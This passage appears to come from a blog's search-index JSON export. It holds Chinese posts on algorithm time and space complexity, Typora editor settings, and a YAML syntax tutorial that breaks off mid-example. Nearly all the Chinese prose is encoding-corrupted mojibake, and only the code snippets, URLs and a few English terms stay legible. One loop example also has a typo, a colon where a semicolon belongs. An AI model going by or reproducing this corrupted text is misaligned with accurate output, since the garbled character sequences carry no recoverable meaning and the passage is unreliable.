1.å¤æ‚åº¦åˆ†æ\n\nç®—æ³•æœ¬è´¨ä¸Šæ˜¯ä¸€è¿ä¸²çš„è®¡ç®—æ­¥éª¤ã€‚å¯¹äºåŒä¸€ä¸ªé—®é¢˜ï¼Œæˆ‘ä»¬å¯ä»¥ä½¿ç”¨ä¸åŒçš„ç®—æ³•æ¥è·å¾—ç›¸åŒçš„ç»“æœï¼Œå¯æ˜¯åœ¨è®¡ç®—è¿‡ç¨‹ä¸­ç”µè„‘æ¶ˆè€—çš„æ—¶é—´å’Œèµ„æºå´æœ‰å¾ˆå¤§çš„åŒºåˆ«ã€‚é‚£æˆ‘ä»¬å¦‚ä½•æ¥æ¯”è¾ƒä¸åŒç®—æ³•ä¹‹é—´çš„ä¼˜åŠ£æ€§å‘¢ï¼Ÿç›®å‰åˆ†æç®—æ³•ä¸»è¦ä»ã€Œæ—¶é—´ã€å’Œã€Œç©ºé—´ã€ä¸¤ä¸ªç»´åº¦æ¥è¿›è¡Œåˆ†æã€‚\n\n+ æ—¶é—´ç»´åº¦é¡¾åæ€ä¹‰å°±æ˜¯ç®—æ³•éœ€è¦æ¶ˆè€—çš„æ—¶é—´ï¼Œã€Œæ—¶é—´å¤æ‚åº¦ã€æ˜¯å¸¸ç”¨çš„åˆ†æå•ä½ã€‚\n\n+ ç©ºé—´ç»´åº¦ä»£è¡¨ç®—æ³•éœ€è¦å ç”¨çš„å†…å­˜ç©ºé—´ï¼Œæˆ‘ä»¬é€šå¸¸ç”¨ã€Œç©ºé—´å¤æ‚åº¦ã€æ¥åˆ†æã€‚\n\n<!-- more -->\n\n### 1.1 æ—¶é—´å¤æ‚åº¦\n\nå¤§Oç¬¦å·è¡¨ç¤ºæ³•ï¼Œæ—¢ T(n) = O(f(n))ï¼Œå®ƒè¡¨ç¤ºä¸€ä¸ªç®—æ³•çš„**æ¸è¿›æ—¶é—´å¤æ‚åº¦**ã€‚å…¶ä¸­ f(n) è¡¨ç¤ºä»£ç æ‰§è¡Œæ¬¡æ•°ä¹‹å’Œï¼ŒOè¡¨ç¤ºæ­£æ¯”ä¾‹å…³ç³»ã€‚æˆ‘ä»¬æ¥çœ‹ä¸€ä¸ªä¾‹å­ï¼š\n\n```\nfor (int i = 1; i <= n; i++) {\n    x++;\n}\n```\n\næ¯ä¸ªç®—æ³•éœ€è¦å¤šå°‘çš„è¿è¡Œæ—¶é—´å‘¢ï¼Ÿæˆ‘ä»¬çŸ¥é“è¿™ä¸ªfor loopæœ‰nä¸ªå¾ªç¯ï¼Œå‡è®¾å…¶ä¸­ x++ è®¡ç®—çš„æ¶ˆè€—æ˜¯ä¸€ä¸ªå•ä½ï¼Œé‚£ä¹ˆç¬¬ä¸€æ¬¡å¾ªç¯æ˜¯1å•ä½ï¼Œç¬¬äºŒæ¬¡å¾ªç¯æ˜¯2å•ä½ï¼Œæ‰€ä»¥æ•´ä¸ªå¾ªç¯è¯­å¥å°±è¦æ¶ˆè€—nä¸ªå•ä½ã€‚å¯ä»¥å‘ç°ï¼Œæ¶ˆè€—çš„å•ä½æ—¶é—´éšç€å¾ªç¯çš„æ¬¡æ•°è€Œå˜åŒ–ï¼Œå¾ªç¯æ¬¡æ•°ä¸º1ï¼Œæ—¶é—´ä¸º1å•ä½ï¼›å¾ªç¯æ¬¡æ•°ä¸º10ï¼Œæ—¶é—´ä¸º10å•ä½ï¼›å¾ªç¯æ¬¡æ•°ä¸ºnï¼Œæ—¶é—´ä¸ºnå•ä½ã€‚æ‰€ä»¥è¿™ä¸ªç®—æ³•çš„ã€Œæ—¶é—´å¤æ‚åº¦ã€å¯ä»¥è¡¨ç¤ºä¸ºï¼šT (n) = O(n)ã€‚\n\n\n\næœ‰äººå¯èƒ½ä¸åŒæ„äº†ï¼Œå› ä¸ºä¸¥æ ¼è®¡ç®—ä¸‹ï¼Œint i = 1ä¹Ÿè¦æ¶ˆè€—1å•ä½æ—¶é—´ï¼Œi <= nå’Œi++ä¹Ÿéƒ½éœ€è¦1å•ä½æ—¶é—´ï¼Œæ‰€ä»¥ä¸¥æ ¼æ¥è¯´æ€»æ—¶é—´æ˜¯ T(n) = 1 + 3nã€‚ä½†æ˜¯æˆ‘ä»¬ä¾ç„¶ä¼šç®€åŒ–ä¸ºnï¼Œå› ä¸ºã€Œå¤§Oè¡¨ç¤ºæ³•ã€ç”¨ä¸è¡¨ç¤ºè®¡ç®—çš„å¢é•¿å˜åŒ–è¶‹åŠ¿ã€‚\n\n\nåœ¨è¿™ä¸ªä¾‹å­ä¸­ï¼Œå¦‚æœnæ— é™å¤§çš„æ—¶å€™ï¼ŒT(n) = 1 + 3n ä¸­çš„å¸¸æ•°1å°±æ²¡æœ‰æ„ä¹‰äº†ï¼Œå€æ•°3ä¹Ÿå½±å“ä¸å¤§ã€‚æ‰€ä»¥ç®€åŒ–ä¸º T(n) = O(n) å°±å¯ä»¥ äº†ã€‚\n\n\n\næˆ‘ä»¬å†æ¥çœ‹ä¸€ä¸ªä¾‹å­ï¼š\n\n```\nfor (int i = 1; i <= n; i++) {\n    for (int j = 1; j <= n; j++) {\n        x++;\n    }\n}\n```\n\nåœ¨å¤–å±‚å¾ªç¯ä¸­ï¼Œi æ€»å…±éœ€è¦nå±‚å¾ªç¯ï¼Œåœ¨æ¯ä¸€æ¬¡å†…å±‚å¾ªç¯ä¸­ï¼Œj ä¹Ÿä¼šå¾ªç¯næ¬¡ã€‚å¦‚æœç”¨ã€Œå¤§Oè¡¨ç¤ºæ³•ã€æ¥è®¡ç®—ï¼Œé‚£ä¹ˆä¸¤ä¸ªå¾ªç¯è¯­å¥çš„å¤æ‚åº¦å°±æ˜¯ O(nÂ²)ï¼Œå¦‚æœæˆ‘ä»¬å°†è¿™ä¸¤ä¸ªç®—æ³•åˆå¹¶åˆ°ä¸€èµ·ï¼š\n\n```\nfor (int i = 1; i <= n; i++) {\n    x++;\n}\nfor (int i = 1; i <= n; i++) {\n    for (int j = 1; j <= n; j++) {\n        x++;\n    }\n}\n```\n\næ•´ä¸ªç®—æ³•å¤æ‚åº¦å°±å˜ä¸º O(n + nÂ²)ï¼Œåœ¨næ— é™å¤§çš„æƒ…å†µä¸‹ï¼Œå¯ä»¥ç®€åŒ–ä¸º O(nÂ²)ã€‚\n\n### 1.2 å¸¸ç”¨çš„æ—¶é—´å¤æ‚åº¦é‡çº§\n\n![1](ç®—æ³•å¤æ‚åº¦çš„ç†è§£/0.png)\n\n- å¸¸æ•°é˜¶O(1)\n- å¯¹æ•°é˜¶O(logN)\n- çº¿æ€§é˜¶O(n)\n- çº¿æ€§å¯¹æ•°é˜¶O(nlogN)\n- å¹³æ–¹é˜¶O(nÂ²)\n- ç«‹æ–¹é˜¶O(nÂ³)\n- Kæ¬¡æ–¹é˜¶O(n^k)\n- æŒ‡æ•°é˜¶(2^n)\n- é˜¶ä¹˜O(n!)\n\nä¸Šé¢çš„æ—¶é—´å¤æ‚ä»ä¸Šåˆ°ä¸‹å¤æ‚åº¦è¶Šæ¥è¶Šå¤§ï¼Œä¹Ÿæ„å‘³ç€æ‰§è¡Œæ•ˆç‡è¶Šæ¥è¶Šä½ã€‚\n\n\n\n1. å¸¸æ•°é˜¶O(1)\n\nåªè¦æ²¡æœ‰å¾ªç¯æˆ–é€’å½’ç­‰å¤æ‚é€»è¾‘ï¼Œæ— è®ºä»£ç æ‰§è¡Œå¤šå°‘è¡Œï¼Œä»£ç å¤æ‚åº¦éƒ½ä¸ºO(1)ï¼Œå¦‚ä¸‹ï¼š\n\n```\nint x = 0;\nint y = 1;\nint temp = x;\nx = y;\ny = temp;\n```\n\nä¸Šè¿°ä»£ç åœ¨æ‰§è¡Œçš„æ—¶å€™ï¼Œæ‰€æ¶ˆè€—çš„æ—¶é—´ä¸ä¼šéšç€ç‰¹å®šå˜é‡çš„å¢é•¿è€Œå¢é•¿ï¼Œå³ä½¿æœ‰å‡ ä¸‡è¡Œè¿™æ ·çš„ä»£ç ï¼Œæˆ‘ä»¬éƒ½å¯ä»¥ç”¨O(1)æ¥è¡¨ç¤ºå®ƒçš„æ—¶é—´å¤æ‚åº¦ã€‚\n\n2.çº¿æ€§é˜¶O(n)\n\næˆ‘ä»¬åœ¨ä¸Šè¿°çš„ä¾‹å­ä¸­è®²è§£è¿‡O(n)çš„ç®—æ³•ï¼š\n\n```\nfor (int i = 1; i <= n; i++) {\n    x++;\n}\n```\n\nåœ¨è¿™æ®µä»£ç ä¸­ï¼Œforå¾ªç¯ä¼šæ‰§è¡Œnéï¼Œå› æ­¤è®¡ç®—æ¶ˆè€—çš„æ—¶é—´æ˜¯éšç€nçš„å˜åŒ–è€Œå˜åŒ–ï¼Œå› æ­¤è¿™ç±»ä»£ç éƒ½å¯ä»¥ç”¨O(n)æ¥è¡¨ç¤ºå…¶æ—¶é—´å¤æ‚åº¦ã€‚\n\n3.å¯¹æ•°é˜¶O(logN)\n\næ¥çœ‹ä»¥ä¸‹çš„ä¾‹å­ï¼š\n\n```\nint i = 1;\nwhile(i < n) {\n    i = i * 2;\n}\n```\n\nåœ¨ä¸Šé¢çš„å¾ªç¯ä¸­ï¼Œæ¯æ¬¡iéƒ½ä¼šè¢«ä¹˜ä»¥2ï¼Œä¹Ÿæ„å‘³ç€æ¯æ¬¡ i éƒ½ç¦» n æ›´è¿›ä¸€æ­¥ã€‚é‚£éœ€è¦å¤šå°‘æ¬¡å¾ªç¯ i æ‰èƒ½ç­‰äºæˆ–å¤§äº n å‘¢ï¼Œä¹Ÿå°±æ˜¯æ±‚è§£2çš„xæ¬¡æ–¹ç­‰äºnï¼Œç­”æ¡ˆx=log2^nã€‚ä¹Ÿå°±æ˜¯è¯´å¾ªç¯ log2^næ¬¡ä¹‹åï¼Œiä¼šå¤§äºç­‰äºnï¼Œè¿™æ®µä»£ç å°±ç»“æŸäº†ã€‚æ‰€ä»¥æ­¤ä»£ç çš„å¤æ‚åº¦ä¸ºï¼šO(logN)ã€‚\n\n4.çº¿æ€§å¯¹æ•°é˜¶O(nlogN)\n\nçº¿æ€§å¯¹æ•°é˜¶O(nlogN)å¾ˆå¥½ç†è§£ï¼Œä¹Ÿå°±æ˜¯å°†å¤æ‚åº¦ä¸ºO(logN)çš„ä»£ç å¾ªç¯néï¼š\n\n```\nfor(int i = 0; i <= n: i++) {\n    int x = 1;\n    while(x < n) {\n        x = x * 2;\n    }\n}\n```\n\nå› ä¸ºæ¯æ¬¡å¾ªç¯çš„å¤æ‚åº¦ä¸ºO(logN)ï¼Œæ‰€ä»¥n * logN = O(nlogN)\n\n5.å¹³æ–¹é˜¶O(nÂ²)\n\nåœ¨ä¹‹å‰çš„ä¾‹å­æˆ‘ä»¬ä¹Ÿè®²è¿‡ï¼ŒO(nÂ²)å°±æ˜¯å°†å¾ªç¯æ¬¡æ•°ä¸ºnçš„ä»£ç å†å¾ªç¯néï¼š\n\n```\nfor (int i = 1; i <= n; i++) {\n    for (int j = 1; j <= n; j++) {\n        x++;\n    }\n}\n```\n\nO(nÂ²)çš„æœ¬è´¨å°±æ˜¯n * nï¼Œå¦‚æœæˆ‘ä»¬å°†å†…å±‚çš„å¾ªç¯æ¬¡æ•°æ”¹ä¸ºmï¼š\n\n```\nfor (int i = 1; i <= n; i++) {\n    for (int j = 1; j <= m; j++) {\n        x++;\n    }\n}\n```\n\nå¤æ‚åº¦å°±å˜ä¸º n * m = O(n * m)ã€‚\n\nå…³äºä¸€äº›æ›´é«˜çš„é˜¶çº§æ¯”å¦‚O(nÂ³)æˆ–è€…O(n^k)ï¼Œæˆ‘ä»¬å¯ä»¥å‚è€ƒO(nÂ²)æ¥ç†è§£å³å¯ï¼ŒO(nÂ³)ç›¸å½“äºä¸‰å±‚å¾ªç¯ï¼Œä»¥æ­¤ç±»æ¨ã€‚\n\né™¤äº†ã€Œå¤§Oè¡¨ç¤ºæ³•ã€è¿˜æœ‰å…¶ä»–ã€Œå¹³å‡æ—¶é—´å¤æ‚åº¦ã€ã€ã€Œå‡æ‘Šæ—¶é—´å¤æ‚åº¦ã€ã€ã€Œæœ€åæ—¶é—´å¤æ‚åº¦ã€ã€ã€Œæœ€å¥½æ—¶é—´å¤æ‚åº¦ã€ç­‰ç­‰åˆ†ææŒ‡æ•°ï¼Œä½†æ˜¯æœ€å¸¸ç”¨çš„ä¾ç„¶æ˜¯ã€Œå¤§Oè¡¨ç¤ºæ³•ã€ã€‚\n\n\n\n### 1.3 ç©ºé—´å¤æ‚åº¦\n\næ—¢ç„¶ã€Œæ—¶é—´å¤æ‚åº¦ã€ä¸æ˜¯è®¡ç®—ç¨‹åºå…·ä½“æ¶ˆè€—çš„æ—¶é—´ï¼Œã€Œç©ºé—´å¤æ‚åº¦ã€ä¹Ÿä¸æ˜¯ç”¨æ¥è®¡ç®—ç¨‹åºå…·ä½“å ç”¨çš„ç©ºé—´ã€‚éšç€é—®é¢˜é‡çº§çš„å˜å¤§ï¼Œç¨‹åºéœ€è¦åˆ†é…çš„å†…å­˜ç©ºé—´ä¹Ÿå¯èƒ½ä¼šå˜å¾—æ›´å¤šï¼Œè€Œã€Œç©ºé—´å¤æ‚åº¦ã€åæ˜ çš„åˆ™æ˜¯å†…å­˜ç©ºé—´å¢é•¿çš„è¶‹åŠ¿ã€‚\n\n\n\n### 1.4 å¸¸ç”¨çš„ç©ºé—´å¤æ‚åº¦\n\næ¯”è¾ƒå¸¸ç”¨çš„ç©ºé—´å¤æ‚åº¦æœ‰ï¼šO(1)ã€O(n)ã€O(nÂ²)ã€‚åœ¨ä¸‹é¢çš„ä¾‹å­ä¸­ï¼Œæˆ‘ä»¬ç”¨ S(n) æ¥å®šä¹‰ã€Œç©ºé—´å¤æ‚åº¦ã€ã€‚\n\n1. O(1)ç©ºé—´å¤æ‚åº¦\n\nå¦‚æœç®—æ³•æ‰§è¡Œæ‰€éœ€è¦çš„ä¸´æ—¶ç©ºé—´ä¸éšç€æŸä¸ªå˜é‡nçš„å¤§å°è€Œå˜åŒ–ï¼Œæ­¤ç®—æ³•ç©ºé—´å¤æ‚åº¦ä¸ºä¸€ä¸ªå¸¸é‡ï¼Œå¯è¡¨ç¤ºä¸º O(1)ï¼š\n\n```\nint x = 0;\nint y = 0;\nx++;\ny++;\n```\n\nå…¶ä¸­x, yæ‰€åˆ†é…çš„ç©ºé—´ä¸éšç€å¤„ç†æ•°æ®é‡å˜åŒ–ï¼Œå› æ­¤ã€Œç©ºé—´å¤æ‚åº¦ã€ä¸º O(1)\n\n2. O(n)ç©ºé—´å¤æ‚åº¦\n\nä»¥ä¸‹çš„ä»£ç ç»™é•¿åº¦ä¸ºnçš„æ•°ç»„èµ‹å€¼ï¼š\n\n```\nint[] newArray = new int[n];\nfor (int i = 0; i < n; i++) {\n    newArray[i] = i;\n}\n```\n\nåœ¨è¿™æ®µä»£ç ä¸­ï¼Œæˆ‘ä»¬åˆ›å»ºäº†ä¸€ä¸ªé•¿åº¦ä¸º n çš„æ•°ç»„ï¼Œç„¶ååœ¨å¾ªç¯ä¸­ä¸ºå…¶ä¸­çš„å…ƒç´ èµ‹å€¼ã€‚å› æ­¤ï¼Œè¿™æ®µä»£ç çš„ã€Œç©ºé—´å¤æ‚åº¦ã€å–å†³äº newArray çš„é•¿åº¦ï¼Œä¹Ÿå°±æ˜¯ nï¼Œæ‰€ä»¥ S(n) = O(n)ã€‚\n\n\n\n# 2. ç®—æ³•å¤æ‚åº¦é€ŸæŸ¥è¡¨\n\n### 2.1 æŠ½è±¡æ•°æ®ç»“æ„çš„æ“ä½œå¤æ‚åº¦\n\n![1](ç®—æ³•å¤æ‚åº¦çš„ç†è§£/1.png)\n\n\n\n### 2.2 æ•°ç»„æ’åº\n\n![1](ç®—æ³•å¤æ‚åº¦çš„ç†è§£/2.png)\n\nå†’æ³¡ã€é€‰æ‹©ã€æ’å…¥ æ’åºéœ€è¦ä¸¤ä¸ªforå¾ªç¯ï¼Œæ¯æ¬¡åªå…³æ³¨ä¸€ä¸ªå…ƒç´ ï¼Œå¹³å‡æ—¶é—´å¤æ‚åº¦ä¸ºO(nÂ²)ï¼‰ï¼ˆä¸€éæ‰¾å…ƒç´ O(n)ï¼Œä¸€éæ‰¾ä½ç½®O(n)ï¼‰\n\nå¿«é€Ÿã€å½’å¹¶ã€å¸Œå°”ã€å †åŸºäºäºŒåˆ†æ€æƒ³ï¼Œlogä»¥2ä¸ºåº•ï¼Œå¹³å‡æ—¶é—´å¤æ‚åº¦ä¸ºO(nlogn)ï¼ˆä¸€éæ‰¾å…ƒç´ O(n)ï¼Œä¸€éæ‰¾ä½ç½®O(logn)ï¼‰\n\n\n\n### 2.3 å †\n\n+ å»ºå †çš„æ—¶é—´å¤æ‚åº¦æ˜¯O(n)ï¼›\n+ å †çš„æ’å…¥ã€åˆ é™¤å…ƒç´ çš„æ—¶é—´å¤æ‚åº¦éƒ½æ˜¯O(log n)ï¼›\n+ å †æ’åºçš„æ—¶é—´å¤æ‚åº¦æ˜¯O(nlog n)ï¼›\n+ å †æ’åºçš„ç©ºé—´å¤æ‚åº¦æ˜¯O(1)ï¼›\n\n# 3. å‚è€ƒèµ„æ–™\n\n+ https://turingplanet.org/2020/02/03/%E3%80%90%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E5%92%8C%E7%AE%97%E6%B3%953%E3%80%91/\n+ https://blog.csdn.net/Jmayday/article/details/104529770","tags":["ç®—æ³•"],"categories":["ç®—æ³•"]},{"title":"markdownå†™ä½œtyporaçš„é…ç½®","url":"%2Fp%2F3527bba1.html","content":"\nmacä¸Šå†™ä½œmarkdownï¼Œä¸ªäººæ„Ÿè§‰ç›®å‰è¿˜æ²¡æœ‰æ¯”typoraæ›´ä¼˜ç§€çš„å·¥å…·ï¼ˆobsidianä¸æœï¼‰ã€‚\n\n<!-- more -->\n\n# 1. å¸¸ç”¨é…ç½®\n\n### 1.1 æ˜¾ç¤ºå¤§çº²\n\nView->Outline\n\n### 1.2 æ’å…¥å¤§çº²\n\nåœ¨markdown æ’å…¥ `[TOC]` å³å¯ã€‚\n\n\n### 1.3 å›¾ç‰‡æ‹·è´åˆ°æŒ‡å®šç›®å½•\n\nå›¾ç‰‡ç›´æ¥ `Ctrl + v` å³å¯ç²˜è´´æ‹·è´åˆ°æŒ‡å®šç›®å½•å¹¶å®æ—¶é¢„è§ˆã€‚\n\n<img src=\"markdownå†™ä½œtyporaçš„é…ç½®/image-20220108155908753.png\" alt=\"image-20220108155908753\" style=\"zoom:50%;\" />\n\n# 2. ä¸»é¢˜è®¾ç½®\n\n### 2.1 é»‘è‰²ä¸»é¢˜\n\n+ Dracula\n\n### 2.2 ç™½è‰²ä¸»é¢˜\n\n+ Ladder ï¼ˆç´ æçš„æ„Ÿè§‰ï¼‰\n\n+ Lapis ï¼ˆå•†åŠ¡çš„æ„Ÿè§‰ï¼‰\n\n+ Next-helvetica ï¼ˆè‡ªå·±åšå®¢ï¼Œé€‚åˆä»£ç ï¼‰\n\n+ Notion Light Enhanced ï¼ˆgithubçš„æ„Ÿè§‰ï¼Œé€‚åˆä»£ç ï¼‰\n\n  \n\n  \n","tags":["typora"],"categories":["è½¯ä»¶"]},{"title":"YAMLè¯­è¨€æ•™ç¨‹","url":"%2Fp%2Ff2ad59fc.html","content":"\n## YAMLä»‹ç»\n\nYAML è¯­è¨€ï¼ˆå‘éŸ³ /ËˆjÃ¦mÉ™l/ ï¼‰çš„è®¾è®¡ç›®æ ‡ï¼Œå°±æ˜¯æ–¹ä¾¿äººç±»è¯»å†™ã€‚å®ƒå®è´¨ä¸Šæ˜¯ä¸€ç§é€šç”¨çš„æ•°æ®ä¸²è¡ŒåŒ–æ ¼å¼ã€‚å®ƒçš„åŸºæœ¬è¯­æ³•è§„åˆ™å¦‚ä¸‹ã€‚\n\n- å¤§å°å†™æ•æ„Ÿ\n- ä½¿ç”¨ç¼©è¿›è¡¨ç¤ºå±‚çº§å…³ç³»\n- ç¼©è¿›æ—¶ä¸å…è®¸ä½¿ç”¨Tabé”®ï¼Œåªå…è®¸ä½¿ç”¨ç©ºæ ¼ã€‚\n- ç¼©è¿›çš„ç©ºæ ¼æ•°ç›®ä¸é‡è¦ï¼Œåªè¦ç›¸åŒå±‚çº§çš„å…ƒç´ å·¦ä¾§å¯¹é½å³å¯\n\n\n\nYAML æ”¯æŒçš„æ•°æ®ç»“æ„æœ‰ä¸‰ç§ã€‚\n\n- å¯¹è±¡ï¼šé”®å€¼å¯¹çš„é›†åˆ(map)\n- æ•°ç»„ï¼šä¸€ç»„æŒ‰æ¬¡åºæ’åˆ—çš„å€¼(array)\n- çº¯é‡ï¼ˆscalarsï¼‰ï¼šå•ä¸ªçš„ã€ä¸å¯å†åˆ†çš„å€¼\n\n<!-- more -->\n\n## YAML è¯­æ³•\n\n1.  `#` è¡¨ç¤ºæ³¨é‡Šï¼Œä»è¿™ä¸ªå­—ç¬¦ä¸€ç›´åˆ°è¡Œå°¾ï¼Œéƒ½ä¼šè¢«è§£æå™¨å¿½ç•¥ã€‚\n\n\n\n2. `...` å’Œ`---`é…åˆä½¿ç”¨ï¼Œåœ¨ä¸€ä¸ªé…ç½®æ–‡ä»¶ä¸­ä»£è¡¨ä¸€ä¸ªæ–‡ä»¶çš„ç»“æŸï¼š\n\n\n   ```\n---\ntime: 20:03:20\nplayer: Sammy Sosa\naction: strike (miss)\n...\n\n---\ntime: 20:03:47\nplayer: Sammy Sosa\naction: grand slam\n...\n   ```\n\n  ç›¸å½“äºåœ¨ä¸€ä¸ªyamlæ–‡ä»¶ä¸­è¿ç»­å†™äº†ä¸¤ä¸ªyamlé…ç½®é¡¹ã€‚\n\n\n\n#### å¯¹è±¡\n\nå¯¹è±¡çš„ä¸€ç»„é”®å€¼å¯¹ï¼Œä½¿ç”¨å†’å·ç»“æ„è¡¨ç¤ºã€‚\n\n```javascript\nanimal: pets\n```\n\nè½¬ä¸º JavaScript å¦‚ä¸‹ã€‚\n\n```javascript\n{ animal: 'pets' }\n```\n\nYaml ä¹Ÿå…è®¸å¦ä¸€ç§å†™æ³•ï¼Œå°†æ‰€æœ‰é”®å€¼å¯¹å†™æˆä¸€ä¸ªè¡Œå†…å¯¹è±¡ã€‚\n\n```javascript\nhash: { name: Steve, foo: bar } \n```\n\nè½¬ä¸º JavaScript å¦‚ä¸‹ã€‚\n\n```javascript\n{ hash: { name: 'Steve', foo: 'bar' } }\n```\n\n\n\nè¾ƒä¸ºå¤æ‚çš„å¯¹è±¡æ ¼å¼ï¼Œå¯ä»¥ä½¿ç”¨é—®å·åŠ ä¸€ä¸ªç©ºæ ¼ä»£è¡¨ä¸€ä¸ªå¤æ‚çš„keyï¼Œé…åˆä¸€ä¸ªå†’å·åŠ ä¸€ä¸ªç©ºæ ¼ä»£è¡¨ä¸€ä¸ªvalueï¼š\n\n```\n?  \n    - complexkey1\n    - complexkey2\n:\n    - complexvalue1\n    - complexvalue2\n```\n\næ„æ€å³å¯¹è±¡çš„å±æ€§æ˜¯ä¸€ä¸ªæ•°ç»„[complexkey1,complexkey2]ï¼Œå¯¹åº”çš„å€¼ä¹Ÿæ˜¯ä¸€ä¸ªæ•°ç»„[complexvalue1,complexvalue2]\n\n\n\n#### æ•°ç»„\n\nä¸€ç»„è¿è¯çº¿å¼€å¤´çš„è¡Œï¼Œæ„æˆä¸€ä¸ªæ•°ç»„ã€‚\n\n```javascript\n- Cat\n- Dog\n- Goldfish\n```\n\nè½¬ä¸º JavaScript å¦‚ä¸‹ã€‚\n\n```javascript\n[ 'Cat', 'Dog', 'Goldfish' ]\n```\n\n\n\næ•°æ®ç»“æ„çš„å­æˆå‘˜æ˜¯ä¸€ä¸ªæ•°ç»„ï¼Œåˆ™å¯ä»¥åœ¨è¯¥é¡¹ä¸‹é¢ç¼©è¿›ä¸€ä¸ªç©ºæ ¼ã€‚\n\n```javascript\n-\n - Cat\n - Dog\n - Goldfish\n```\n\nè½¬ä¸º JavaScript å¦‚ä¸‹ã€‚\n\n```javascript\n[ [ 'Cat', 'Dog', 'Goldfish' ] ]\n```\n\næ•°ç»„ä¹Ÿå¯ä»¥é‡‡ç”¨è¡Œå†…è¡¨ç¤ºæ³•ã€‚\n\n```javascript\nanimal: [Cat, Dog]\n```\n\nè½¬ä¸º JavaScript å¦‚ä¸‹ã€‚\n\n```javascript\n{ animal: [ 'Cat', 'Dog' ] }\n```\n\n#### å¤åˆç»“æ„\n\nå¯¹è±¡å’Œæ•°ç»„å¯ä»¥ç»“åˆä½¿ç”¨ï¼Œå½¢æˆå¤åˆç»“æ„ã€‚\n\n```javascript\nlanguages:\n - Ruby\n - Perl\n - Python \nwebsites:\n YAML: yaml.org \n Ruby: ruby-lang.org \n Python: python.org \n Perl: use.perl.org \n```\n\nè½¬ä¸º JavaScript å¦‚ä¸‹ã€‚\n\n```javascript\n{ languages: [ 'Ruby', 'Perl', 'Python' ],\n  websites: \n   { \n     YAML: 'yaml.org',\n     Ruby: 'ruby-lang.org',\n     Python: 'python.org',\n     Perl: 'use.perl.org' \n   } \n}\n```\n\n#### çº¯é‡\n\nçº¯é‡æ˜¯æœ€åŸºæœ¬çš„ã€ä¸å¯å†åˆ†çš„å€¼ã€‚ä»¥ä¸‹æ•°æ®ç±»å‹éƒ½å±äº JavaScript çš„çº¯é‡ã€‚\n\n- å­—ç¬¦ä¸²\n- å¸ƒå°”å€¼\n- æ•´æ•°\n- æµ®ç‚¹æ•°\n- Null\n- æ—¶é—´\n- æ—¥æœŸ\n\næ•°å€¼ç›´æ¥ä»¥å­—é¢é‡çš„å½¢å¼è¡¨ç¤ºã€‚\n\n```javascript\nnumber: 12.30\n```\n\nè½¬ä¸º JavaScript å¦‚ä¸‹ã€‚\n\n```javascript\n{ number: 12.30 }\n```\n\n\n\nå¸ƒå°”å€¼ç”¨`true`å’Œ`false`è¡¨ç¤ºã€‚\n\n```javascript\nisSet: true\n```\n\nè½¬ä¸º JavaScript å¦‚ä¸‹ã€‚\n\n```javascript\n{ isSet: true }\n```\n\n\n\n`null`ç”¨`~`è¡¨ç¤ºã€‚\n\n```javascript\nparent: ~ \n```\n\nè½¬ä¸º JavaScript å¦‚ä¸‹ã€‚\n\n```javascript\n{ parent: null }\n```\n\n\n\næ—¶é—´é‡‡ç”¨ ISO8601 æ ¼å¼ã€‚\n\n```javascript\niso8601: 2001-12-14t21:59:43.10-05:00 \n```\n\nè½¬ä¸º JavaScript å¦‚ä¸‹ã€‚\n\n```javascript\n{ iso8601: new Date('2001-12-14t21:59:43.10-05:00') }\n```\n\n\n\næ—¥æœŸé‡‡ç”¨å¤åˆ iso8601 æ ¼å¼çš„å¹´ã€æœˆã€æ—¥è¡¨ç¤ºã€‚\n\n```javascript\ndate: 1976-07-31\n```\n\nè½¬ä¸º JavaScript å¦‚ä¸‹ã€‚\n\n```javascript\n{ date: new Date('1976-07-31') }\n```\n\n\n\nYAML å…è®¸ä½¿ç”¨ä¸¤ä¸ªæ„Ÿå¹å·ï¼Œå¼ºåˆ¶è½¬æ¢æ•°æ®ç±»å‹ã€‚\n\n```javascript\ne: !!str 123\nf: !!str true\n```\n\nè½¬ä¸º JavaScript å¦‚ä¸‹ã€‚\n\n```javascript\n{ e: '123', f: 'true' }\n```\n\n\n\n#### å­—ç¬¦ä¸²\n\nå­—ç¬¦ä¸²æ˜¯æœ€å¸¸è§ï¼Œä¹Ÿæ˜¯æœ€å¤æ‚çš„ä¸€ç§æ•°æ®ç±»å‹ã€‚å­—ç¬¦ä¸²é»˜è®¤ä¸ä½¿ç”¨å¼•å·è¡¨ç¤ºã€‚\n\n```javascript\nstr: è¿™æ˜¯ä¸€è¡Œå­—ç¬¦ä¸²\n```\n\nè½¬ä¸º JavaScript å¦‚ä¸‹ã€‚\n\n```javascript\n{ str: 'è¿™æ˜¯ä¸€è¡Œå­—ç¬¦ä¸²' }\n```\n\n\n\nå¦‚æœå­—ç¬¦ä¸²ä¹‹ä¸­åŒ…å«ç©ºæ ¼æˆ–ç‰¹æ®Šå­—ç¬¦ï¼Œéœ€è¦æ”¾åœ¨å¼•å·ä¹‹ä¸­ã€‚\n\n```javascript\nstr: 'å†…å®¹ï¼š å­—ç¬¦ä¸²'\n```\n\nè½¬ä¸º JavaScript å¦‚ä¸‹ã€‚\n\n```javascript\n{ str: 'å†…å®¹: å­—ç¬¦ä¸²' }\n```\n\n\n\nå•å¼•å·å’ŒåŒå¼•å·éƒ½å¯ä»¥ä½¿ç”¨ï¼Œ`åŒå¼•å·ä¸ä¼šå¯¹ç‰¹æ®Šå­—ç¬¦è½¬ä¹‰ã€‚`\n\n```javascript\ns1: 'å†…å®¹\\nå­—ç¬¦ä¸²'\ns2: \"å†…å®¹\\nå­—ç¬¦ä¸²\"\n```\n\nè½¬ä¸º JavaScript å¦‚ä¸‹ã€‚\n\n```javascript\n{ s1: 'å†…å®¹\\\\nå­—ç¬¦ä¸²', s2: 'å†…å®¹\\nå­—ç¬¦ä¸²' }\n```\n\n\n\nå•å¼•å·ä¹‹ä¸­å¦‚æœè¿˜æœ‰å•å¼•å·ï¼Œå¿…é¡»è¿ç»­ä½¿ç”¨ä¸¤ä¸ªå•å¼•å·è½¬ä¹‰ã€‚\n\n```javascript\nstr: 'labor''s day' \n```\n\nè½¬ä¸º JavaScript å¦‚ä¸‹ã€‚\n\n```javascript\n{ str: 'labor\\'s day' }\n```\n\n\n\nå­—ç¬¦ä¸²å¯ä»¥å†™æˆå¤šè¡Œï¼Œä»ç¬¬äºŒè¡Œå¼€å§‹ï¼Œå¿…é¡»æœ‰ä¸€ä¸ªå•ç©ºæ ¼ç¼©è¿›ã€‚æ¢è¡Œç¬¦ä¼šè¢«è½¬ä¸ºç©ºæ ¼ã€‚\n\n```javascript\nstr: 